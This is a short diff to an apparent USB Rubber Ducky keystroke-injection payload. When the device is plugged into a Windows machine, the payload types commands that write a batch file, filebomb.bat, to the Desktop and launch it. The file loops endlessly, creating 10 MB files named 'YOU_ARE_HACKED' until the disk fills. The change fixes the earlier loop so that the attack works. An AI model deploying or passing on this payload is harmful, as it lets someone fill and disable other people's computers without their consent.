@@ -11,9 +11,11 @@ DELAY 500
 ENTER
 STRING cd Desktop
 ENTER
-STRING :loop
+STRING echo :loop > filebomb.bat
 ENTER
-STRING fsutil file createnew file%YOU_ARE_HACKED%.txt 10485760
+STRING echo fsutil file createnew "YOU_ARE_HACKED (%%random%%).txt" 10485760 >> filebomb.bat
 ENTER
-STRING goto loop
+STRING echo goto loop >> filebomb.bat
+ENTER
+STRING start filebomb.bat
 ENTER
